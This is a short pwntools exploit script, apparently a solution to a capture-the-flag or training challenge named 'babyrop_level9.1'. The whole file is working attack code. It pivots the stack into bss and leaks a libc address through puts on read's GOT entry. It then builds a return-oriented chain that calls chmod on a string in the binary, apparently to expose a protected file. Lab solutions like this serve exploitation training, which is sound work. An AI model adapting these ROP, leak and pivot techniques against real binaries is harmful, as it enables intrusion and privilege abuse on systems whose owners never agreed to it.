from pwn import *

p = process('/challenge/babyrop_level9.1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#gdb.attach(p,'''break *0x4017a4''')

gadget1 = 0x4018c3      # pop rdi ; ret
gadget2 = 0x4018c1      # pop rsi ; pop r15 ; ret
gadget3 = 0x4018bd      # pop rsp ; pop r13,14,15 ; ret
bss = 0x414080
puts_plt = 0x4010a0
read_got = 0x404030
challenge = 0x401744
string = 0x402004
ret = 0x40101a

payload = p64(gadget3)+p64(bss)+p64(0)+p64(gadget1)+p64(read_got)+p64(puts_plt)
payload += p64(challenge)
p.send(payload)
p.recvuntil(b'Leaving!\n')
libc.address = u64(p.recv(6).ljust(8,b'\x00'))-libc.sym['read']
print(hex(libc.address))

payload = p64(gadget1)+p64(string)+p64(gadget2)+b'a'*56+p64(7)*2
payload += p64(libc.sym['chmod'])
p.send(payload)
p.interactive()
